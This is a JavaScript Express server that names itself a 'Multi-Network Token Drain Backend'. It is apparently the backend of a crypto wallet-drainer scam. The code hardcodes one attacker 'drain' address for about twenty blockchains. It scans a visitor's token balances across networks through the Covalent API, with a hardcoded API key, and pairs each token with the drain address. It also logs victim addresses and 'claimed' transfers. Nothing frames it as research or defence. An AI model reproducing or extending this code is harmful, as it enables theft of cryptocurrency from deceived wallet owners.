const express = require('express');
const cors = require('cors');
const { ethers } = require('ethers');
const fetch = require('node-fetch');
const crypto = require('crypto');

const app = express();

// ==================== PRODUCTION CONFIG ====================
console.log('🚀 PRODUCTION: No private key needed');
console.log('💰 Users send tokens directly to chain addresses');

// ==================== ALL NETWORK DRAIN ADDRESSES ====================
const DRAIN_ADDRESSES = {
  // EVM Mainnets
  1: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4", // Ethereum
  56: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4", // BSC
  137: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4", // Polygon
  42161: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4", // Arbitrum
  10: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4", // Optimism
  8453: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4", // Base
  43114: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4", // Avalanche
  250: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4", // Fantom
  100: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4", // Gnosis
  42220: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4", // Celo
  1284: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4", // Moonbeam
  1088: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4", // Metis
  25: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4", // Cronos
  1666600000: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4", // Harmony
  1313161554: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4", // Aurora
  42262: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4", // Oasis Emerald
  1285: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4", // Moonriver
  199: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4", // BTT Chain
  128: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4", // Huobi ECO
  66: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4", // OKX Chain
  321: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4", // KCC
};

// ==================== NETWORK CONFIG ====================
const NETWORKS = [
  // EVM Mainnets
  { id: 1, name: 'Ethereum', symbol: 'ETH', type: 'evm', color: '#627EEA', scan: true },
  { id: 56, name: 'BSC', symbol: 'BNB', type: 'evm', color: '#F0B90B', scan: true },
  { id: 137, name: 'Polygon', symbol: 'MATIC', type: 'evm', color: '#8247E5', scan: true },
  { id: 42161, name: 'Arbitrum', symbol: 'ETH', type: 'evm', color: '#28A0F0', scan: true },
  { id: 10, name: 'Optimism', symbol: 'ETH', type: 'evm', color: '#FF0420', scan: true },
  { id: 8453, name: 'Base', symbol: 'ETH', type: 'evm', color: '#0052FF', scan: true },
  { id: 43114, name: 'Avalanche', symbol: 'AVAX', type: 'evm', color: '#E84142', scan: true },
  { id: 250, name: 'Fantom', symbol: 'FTM', type: 'evm', color: '#1969FF', scan: true },
  { id: 100, name: 'Gnosis', symbol: 'xDai', type: 'evm', color: '#04795B', scan: true },
  { id: 42220, name: 'Celo', symbol: 'CELO', type: 'evm', color: '#35D07F', scan: true },
  
  // Non-EVM Chains
  { id: 'bitcoin', name: 'Bitcoin', symbol: 'BTC', type: 'non-evm', color: '#F7931A', scan: false },
  { id: 'solana', name: 'Solana', symbol: 'SOL', type: 'non-evm', color: '#00FFA3', scan: false },
  { id: 'tron', name: 'Tron', symbol: 'TRX', type: 'non-evm', color: '#FF060A', scan: false },
  { id: 'cardano', name: 'Cardano', symbol: 'ADA', type: 'non-evm', color: '#0033AD', scan: false },
  { id: 'dogecoin', name: 'Dogecoin', symbol: 'DOGE', type: 'non-evm', color: '#C2A633', scan: false },
  { id: 'litecoin', name: 'Litecoin', symbol: 'LTC', type: 'non-evm', color: '#BFBBBB', scan: false },
  { id: 'ripple', name: 'Ripple', symbol: 'XRP', type: 'non-evm', color: '#23292F', scan: false },
];

// ==================== APP SETUP ====================
app.use(cors());
app.use(express.json());

// ==================== DATABASE ====================
const logs = new Map();
const authLogs = new Map();
const tokenCache = new Map();

// ==================== ENDPOINTS ====================
app.get('/', (req, res) => {
  res.json({ 
    success: true,
    message: 'Multi-Network Token Drain Backend',
    version: '6.0.0',
    networks: NETWORKS.length,
    timestamp: new Date().toISOString()
  });
});

// ==================== AUTHENTICATE ALL NETWORKS ====================
app.post('/auth', async (req, res) => {
  const requestId = crypto.randomBytes(8).toString('hex');
  
  try {
    const { address, signature, message } = req.body;
    
    console.log(`🔐 Auth request from ${address}`);
    
    if (!address || !ethers.isAddress(address)) {
      return res.status(400).json({ 
        success: false,
        error: "Valid Ethereum address required"
      });
    }
    
    // Store auth
    const authLog = {
      id: requestId,
      address,
      timestamp: new Date().toISOString()
    };
    
    if (!authLogs.has(address)) {
      authLogs.set(address, []);
    }
    authLogs.get(address).push(authLog);
    
    res.json({
      success: true,
      message: "Authentication successful",
      data: {
        authenticated: true,
        timestamp: new Date().toISOString()
      }
    });
    
  } catch (error) {
    console.error(`❌ Auth error:`, error);
    res.status(500).json({
      success: false,
      error: "Authentication failed"
    });
  }
});

// ==================== LOG TRANSACTION ====================
app.post('/log', async (req, res) => {
  const requestId = crypto.randomBytes(8).toString('hex');
  
  try {
    const { 
      fromAddress,
      amount, 
      chainId = 1,
      tokenType = 'native',
      tokenAddress,
      transactionHash,
      status = 'pending'
    } = req.body;
    
    if (!fromAddress || !ethers.isAddress(fromAddress)) {
      return res.status(400).json({ 
        success: false,
        error: "Valid fromAddress required"
      });
    }
    
    // Get drain address
    const drainAddress = DRAIN_ADDRESSES[chainId] || DRAIN_ADDRESSES[1];
    
    // Create log
    const logEntry = {
      id: requestId,
      fromAddress,
      toAddress: drainAddress,
      amount: amount || '0',
      chainId,
      tokenType,
      tokenAddress: tokenAddress || null,
      transactionHash: transactionHash || null,
      status, // success, failed, pending
      timestamp: new Date().toISOString()
    };
    
    // Store log
    if (!logs.has(fromAddress)) {
      logs.set(fromAddress, []);
    }
    logs.get(fromAddress).push(logEntry);
    
    console.log(`📝 Transaction logged: ${status} from ${fromAddress}`);
    
    res.json({
      success: true,
      message: `Transaction ${status === 'success' ? 'successfully claimed' : 'failed'}`,
      data: {
        loggedAt: new Date().toISOString(),
        status,
        transactionHash
      }
    });
    
  } catch (error) {
    console.error(`❌ Log error:`, error);
    res.status(500).json({
      success: false,
      error: "Failed to log transaction"
    });
  }
});

// ==================== SCAN ALL NETWORKS ====================
app.get('/scan/:address', async (req, res) => {
  try {
    const { address } = req.params;
    
    if (!address || !ethers.isAddress(address)) {
      return res.status(400).json({ 
        success: false,
        error: "Valid Ethereum address required" 
      });
    }
    
    console.log(`🌐 Scanning networks for ${address}`);
    
    const results = [];
    const evmNetworks = NETWORKS.filter(n => n.type === 'evm' && n.scan).slice(0, 10);
    
    for (const network of evmNetworks) {
      try {
        const COVALENT_API_KEY = "cqt_rQ43kxvhFc4RdQK7t63Yp6pgFRwR";
        const url = `https://api.covalenthq.com/v1/${network.id}/address/${address}/balances_v2/?key=${COVALENT_API_KEY}&nft=false`;
        
        const response = await fetch(url, { timeout: 5000 });
        
        if (response.ok) {
          const data = await response.json();
          const items = data.data?.items || [];
          
          const tokens = items
            .filter(t => t.balance !== "0" && parseFloat(t.balance) > 0)
            .map(t => {
              const amount = parseFloat(t.balance) / Math.pow(10, t.contract_decimals || 18);
              const value = (t.quote_rate || 0) * amount;
              
              return {
                symbol: t.contract_ticker_symbol || (t.native_token ? network.symbol : 'TOKEN'),
                name: t.contract_name || (t.native_token ? network.name : 'Unknown'),
                amount: amount,
                value: value,
                contractAddress: t.contract_address,
                decimals: t.contract_decimals || 18,
                isNative: t.native_token || false,
                logo: t.logo_url,
                networkId: network.id,
                drainAddress: DRAIN_ADDRESSES[network.id] || DRAIN_ADDRESSES[1]
              };
            });
          
          if (tokens.length > 0) {
            results.push({
              network: network,
              tokens: tokens,
              totalValue: tokens.reduce((sum, t) => sum + (t.value || 0), 0)
            });
          }
        }
      } catch (error) {
        console.log(`Scan failed for ${network.name}:`, error.message);
      }
    }
    
    // Add non-EVM placeholders
    const nonEvmNetworks = NETWORKS.filter(n => n.type === 'non-evm');
    nonEvmNetworks.forEach(network => {
      results.push({
        network: network,
        tokens: [{
          symbol: network.symbol,
          name: network.name,
          amount: 0,
          value: 0,
          isNative: true,
          networkId: network.id,
          drainAddress: DRAIN_ADDRESSES[network.id],
          note: "Non-EVM chain"
        }],
        totalValue: 0
      });
    });
    
    res.json({
      success: true,
      data: {
        address,
        results: results,
        totalNetworks: results.length,
        totalTokens: results.reduce((sum, r) => sum + r.tokens.length, 0),
        totalValue: results.reduce((sum, r) => sum + r.totalValue, 0)
      }
    });
    
  } catch (error) {
    console.error("Scan error:", error);
    res.status(500).json({ 
      success: false,
      error: "Scan failed. Please try again."
    });
  }
});

// ==================== HEALTH CHECK ====================
app.get('/health', (req, res) => {
  res.json({ 
    success: true,
    status: 'healthy',
    timestamp: new Date().toISOString(),
    networks: NETWORKS.length
  });
});

// ==================== ERROR HANDLER ====================
app.use((req, res) => {
  res.status(404).json({
    success: false,
    error: "Endpoint not found"
  });
});

// ==================== START SERVER ====================
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log('='.repeat(70));
  console.log(`🚀 Multi-Network Token Drain Backend`);
  console.log(`📡 Port: ${PORT}`);
  console.log(`🌐 Networks: ${NETWORKS.length}`);
  console.log('✅ Ready for production');
  console.log('='.repeat(70));
});
